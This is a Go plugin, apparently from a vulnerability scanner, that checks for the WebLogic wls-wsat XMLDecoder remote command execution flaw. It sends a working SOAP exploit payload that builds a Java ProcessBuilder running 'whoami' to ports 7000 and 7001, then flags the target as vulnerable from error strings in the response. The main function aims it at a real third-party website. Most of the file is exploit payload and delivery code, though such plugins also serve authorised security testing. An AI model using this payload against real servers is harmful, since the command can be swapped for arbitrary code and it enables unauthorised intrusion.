/*
host
*/
package main

import (
	"fmt"
	"net"
	"net/url"
	"strings"
	"time"

	"zeroScannerGo/engine"
	"zeroScannerGo/engine/lib/util"
	"zeroScannerGo/engine/lib/zhttp"
)

var (
	InitDnsCache = zhttp.SetDnsCache
	payload      = `<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> <java version="1.8" class="java.beans.XMLDecoder"> <object class="java.lang.ProcessBuilder"> <array class="java.lang.String" length="1"> <void index="0"> <string>whoami</string> </void> </array> <void method="start" /> </object> </java> </work:WorkContext> </soapenv:Header> <soapenv:Body/> </soapenv:Envelope>`
	ports        = []string{"7000", "7001"}
	paths        = []string{"/wls-wsat/CoordinatorPortType"}
)

func Verify(params engine.Params) (result engine.Result) {
	newPorts := util.GetPorts(ports, params.ParsedTarget.Port(), params.ParsedTarget.Path)
	params.ParsedTarget.RawQuery = ""
	for _, port := range newPorts {
		params.ParsedTarget.Host = strings.TrimSuffix(net.JoinHostPort(params.ParsedTarget.Hostname(), port), ":")
		for _, path := range paths {
			params.ParsedTarget.Path = path
			resp, err := zhttp.Post(params.ParsedTarget.String(), &zhttp.RequestOptions{
				DialTimeout:        time.Second * 5,
				RequestTimeout:     time.Second * 5,
				Hosts:              params.Hosts,
				RawCookie:          params.Cookie,
				InsecureSkipVerify: true,
				DisableRedirect:    true,
				ContentType:        "text/xml",
				RawData:            payload,
			})
			if err != nil {
				break
			}
			body := resp.String()
			resp.Close()
			if strings.Contains(body, "java.lang.ProcessBuilder cannot be cast to java.lang.String") {
				result.Vul = true
				result.VulUrl = params.ParsedTarget.String()
				result.RawReq = resp.RawRequest()
				result.VulInfo = "weblogic xml命令执行"
				return
			} else if strings.Contains(body, "<faultcode>S:Server") {
				result.Vul = true
				result.VulUrl = params.ParsedTarget.String()
				result.VulInfo = "weblogic对外"
				return
			}
		}
	}

	return
}

func main() {
	params := engine.Params{}
	params.Method = "GET"
	params.Target = "https://www.jd.com"
	parsedTarget, _ := url.Parse(params.Target)
	params.ParsedTarget = *parsedTarget

	result := Verify(params)
	fmt.Printf("%+v\r\n", result)
}
